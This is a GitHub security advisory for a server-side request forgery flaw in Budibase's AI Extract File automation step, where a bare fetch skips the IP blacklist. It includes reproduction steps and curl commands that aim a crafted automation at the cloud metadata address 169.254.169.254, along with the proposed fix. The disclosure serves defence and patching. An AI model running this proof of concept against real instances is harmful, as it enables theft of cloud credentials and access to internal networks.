# [H] Budibase: SSRF in AI Extract File Automation Step via Missing IP Blacklist Validation

## Summary
Severity: High
Advisory: GHSA-rpj4-7x2v-wjrf
CVE: CVE-2026-45548
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-15
Source: https://github.com/advisories/GHSA-rpj4-7x2v-wjrf
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.34.8

## Details
## Vulnerability Details

**CWE-918**: Server-Side Request Forgery (SSRF)

The `processUrlFile` function in `packages/server/src/automations/steps/ai/extract.ts` uses `fetch(fileUrl)` directly **without the IP blacklist validation** that is consistently applied to all other automation steps. This allows an authenticated user to trigger server-side requests to internal network addresses.

### Vulnerable Code

**`packages/server/src/automations/steps/ai/extract.ts` (lines 116, 139)**:

```typescript
async function processUrlFile(fileUrl: string, ...): Promise<ExtractInput> {
  const response = await fetch(fileUrl)  // NO blacklist check!
  // ...
  const fallbackResponse = await fetch(fileUrl)  // Also NO blacklist check!
}
```

### Contrast with All Other Automation Steps (Same Codebase)

Every other automation step that makes outbound HTTP requests properly uses `fetchWithBlacklist`:

- `steps/slack.ts:19`: `response = await fetchWithBlacklist(url, {...})`
- `steps/discord.ts:28`: `response = await fetchWithBlacklist(url, {...})`
- `steps/zapier.ts:33`: `response = await fetchWithBlacklist(url, {...})`
- `steps/n8n.ts:53`: `response = await fetchWithBlacklist(url, request)`
- `steps/outgoingWebhook.ts`: `response = await fetchWithBlacklist(url, {...})`
- `steps/make.ts`: `response = await fetchWithBlacklist(url, {...})`

The `fetchWithBlacklist` function (`steps/utils.ts:100`) validates URLs against the IP blacklist which blocks:
- `127.0.0.0/8` (loopback)
- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC1918 private)
- `169.254.0.0/16` (link-local / cloud metadata)
- IPv6 private addresses

The AI Extract File step bypasses all of these protections.

## Steps to Reproduce

### Via Budibase UI

1. Login as builder user
2. Create or open any app
3. Go to **Automations** > **New Automation**
4. Add trigger: **App Action**
5. Add step: **AI > Extract File Data**
6. Set Source: `URL`
7. Set File URL: `http://169.254.169.254/latest/meta-data/` (or any internal IP)
8. Click **Run Test** — the server makes the request without IP blacklist validation

### Via curl (API)

```bash
# 1. Login and get session cookie
curl -s -c /tmp/bb.txt \
  "http://BUDIBASE_HOST/api/global/auth/default/login" \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"YOUR_EMAIL","password":"YOUR_PASSWORD"}'

# 2. Create automation with SSRF payload (replace YOUR_APP_ID)
curl -s -b /tmp/bb.txt \
  "http://BUDIBASE_HOST/api/automations" \
  -X POST -H "Content-Type: application/json" \
  -H "x-budibase-app-id: YOUR_APP_ID" \
  -d '{"name":"SSRF PoC","definition":{"trigger":{"stepId":"APP","event":"row:save"},"steps":[{"stepId":"AI_EXTRACT","inputs":{"source":"URL","fileUrl":"http://169.254.169.254/latest/meta-data/"}}]}}'
```

### Code Review Verification

Compare the vulnerable function with the safe pattern used everywhere else:

```
VULNERABLE (no blacklist):
  packages/server/src/automations/steps/ai/extract.ts:116
    const response = await fetch(fileUrl)

SAFE (with blacklist) - every other step:
  packages/server/src/automations/steps/slack.ts:19
    response = await fetchWithBlacklist(url, {...})
  packages/server/src/automations/steps/discord.ts:28
    response = await fetchWithBlacklist(url, {...})
```

### Expected vs Actual Behavior

**Expected**: `processUrlFile()` should reject internal/private IPs via `fetchWithBlacklist()`
**Actual**: `fetch(fileUrl)` is called directly, allowing requests to 127.0.0.1, 10.x.x.x, 169.254.169.254 etc.

## Impact

An authenticated user with builder permissions can:

- **Access cloud metadata endpoints** (AWS IAM credentials, GCP service tokens, Azure IMDS)
- **Scan internal network** services and ports
- **Access internal APIs** not intended for external access
- **Exfiltrate data** from internal services via the automation response

In Budibase Cloud (SaaS), this could be used to steal cloud provider credentials, potentially leading to full infrastructure compromise.

## Proposed Fix

Replace `fetch(fileUrl)` with `fetchWithBlacklist(fileUrl)`, consistent with all other automation steps:

```typescript
import { fetchWithBlacklist } from "../utils"

async function processUrlFile(fileUrl: string, ...): Promise<ExtractInput> {
  const response = await fetchWithBlacklist(fileUrl)  // Use blacklist
  // ...
  const fallbackResponse = await fetchWithBlacklist(fileUrl)  // Use blacklist
}
```

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-rpj4-7x2v-wjrf
- https://nvd.nist.gov/vuln/detail/CVE-2026-45548
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.38.4
